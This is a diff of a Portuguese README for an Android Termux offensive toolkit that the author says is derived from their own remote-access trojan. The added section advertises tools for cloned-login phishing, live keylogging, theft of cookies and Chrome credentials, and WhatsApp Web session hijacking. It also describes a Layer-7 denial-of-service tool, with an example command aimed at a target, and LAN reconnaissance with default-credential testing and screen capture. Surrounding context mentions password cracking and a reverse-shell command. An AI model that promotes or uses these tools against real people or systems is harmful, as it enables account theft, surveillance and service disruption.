@@ -1,5 +1,8 @@
 # NCR0X :: Ncrox para Termux
 
+### ATENÇÃO: FERRAMENTA CRIADA APARTIR DE SATANACHIA NCROX E MEU RAT: N3CR0RAT
+## sem a parte de acesso remoto e controle total; segue o Markdown abaixo:
+
 > Versão do [Satanachia ncrox](https://github.com/N3CR0-X/ncrox) para o Termux, com réplica dos comandos originais, arsenal ofensivo, repositório de ferramentas e identidade banner próprio.
 > Arquivo único. Sem root. Sem distro. Tudo no aparelho.
 
@@ -329,7 +332,22 @@ Saída: `[+] QUEBRADO: senha123`.
 **Leitura:** o contador `[i] N testados` vai para stderr e mostra o ritmo. bcrypt roda com 1 processo e é ordens de magnitude mais lento — normal.
 
 ---
+### Arsenal pesado
 
+**ncx-htx** — painel de colheita com lure clonado (Google, Instagram, Facebook ou template próprio),
+keylogger em tempo real, captura de cookies/localStorage e extração de credenciais e cookies do Chrome
+via CDP (sessão viva, sem root) ou direto do `/data/data` com `su`. Inclui espelhamento do WhatsApp Web
+sem QR (`harvest wa`) e esteganografia de URL em JPEG (`stego`/`unstego`). Uso: `ncx-htx`, `ncx-htx -h`.
+
+**ncx-reap** — L7 reaper em Go. 22 modos: HTTP/2 multiplexado, rapid reset, HPACK bomb, SYN cru com IP
+falsificado, pipelining, exaustão de FD, slow POST, requests malformados, slowloris, Range gigante,
+churn, flood TLS e UDP, além de recon (`analyze`, `recon`, `git`, `crawl`, `brute`). Uso:
+`ncx-reap -m bomb -u https://IP -H alvo.com -c 500 -t 120s`. Compila no primeiro uso.
+
+**ncx-oz** — recon ofensivo silencioso em LAN. Descobre hosts por ARP forçado sem root, mDNS, SSDP e
+NBNS, faz fingerprint por banner, SNMP, PJL, UPnP, ISAPI e Chromecast, testa credenciais padrão, e
+captura tela por VNC ou ADB (com `--snap`, `--mirror`, `--tap`, `--loot`). Uso: `ncx-oz`,
+`ncx-oz --boot`, `ncx-oz --snap 192.168.0.50`.
 ## 11. Reverse shell
 
 ### `ncx-rev <lhost> <lport> [flags]`
